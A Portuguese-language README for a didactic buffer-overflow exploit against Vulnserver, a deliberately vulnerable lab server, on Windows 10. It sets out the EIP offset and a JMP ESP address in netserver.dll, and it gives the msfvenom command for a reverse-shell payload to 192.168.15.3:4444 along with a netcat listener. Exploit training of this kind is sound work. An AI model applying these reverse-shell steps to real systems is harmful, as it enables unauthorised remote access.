# Exploit - Buffer Overflow Vulnserver

Exploit didático para explorar o vulnserver rodando no Windows 10 Enterprise (x64) e ganhar reverse shell.

## Vulnserver
https://github.com/stephenbradshaw/vulnserver

## Resumo:

- 2007 bytes para sobrescrever o registrador EAX.
- 4 bytes para sobrescrever o registrador EIP (escrito em little endian) com um endereço de retorno JMP ESP da DLL netserver.dll do próprio software, que não possui proteção ASLR.
- 32 No-Operations para garantir a perfeita execução do payload.
- 351 bytes de payload para realizar a conexão reversa com 192.168.15.3:4444.

## Gerando o mesmo payload no MSFVENOM:
```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.3 lport=4444 exitfunc=thread -b "\x00" -f c
```

## Como usar:

É necessário gerar um novo payload de acordo com o IP e porta que deseja receber a conexão reversa.

Após substituir no script prepare para receber a conexão.
```
nc -vnlp 4444
```

Execute o exploit:
```
python3 exploit.py
```
